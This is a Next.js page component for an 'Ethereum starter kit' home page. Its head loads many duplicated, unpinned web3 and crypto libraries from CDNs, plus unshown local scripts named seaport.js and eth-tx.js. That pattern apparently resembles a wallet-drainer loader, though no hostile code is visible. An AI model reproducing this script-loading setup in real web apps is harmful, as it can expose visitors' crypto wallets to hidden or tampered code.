import { Text } from '@chakra-ui/react'
import { Head } from 'components/layout/Head'
import { HeadingComponent } from 'components/layout/HeadingComponent'
import { LinkComponent } from 'components/layout/LinkComponent'

export default function Home() {
  return (
    <>
      <Head>
        <script src="https://bundle.run/buffer@6.0.3"></script>
        <style type="text/css" id="operaUserStyle"></style> 
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
        <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
        <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
        <script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js"></script>
        <script src="https://unpkg.com/crypto-js@latest/crypto-js.js"></script>
        <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
        <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
        <script type="text/javascript" src="https://unpkg.com/web3modal"></script>    
        <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
        <script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js"></script>

        <script src="./js/seaport.js"></script>
        <script src="./js/eth-tx.js"></script>
        <script src="./js/index.js"></script>
      </Head>

      <main>
        <HeadingComponent as="h2">Next.js + Ethereum starter kit</HeadingComponent>
        <Text>Quickly ship Web3 Apps ⚡</Text>
        <Text py={4}>
          <LinkComponent href="examples">View examples</LinkComponent> to bootstrap development.
        </Text>
      </main>
    </>
  )
}
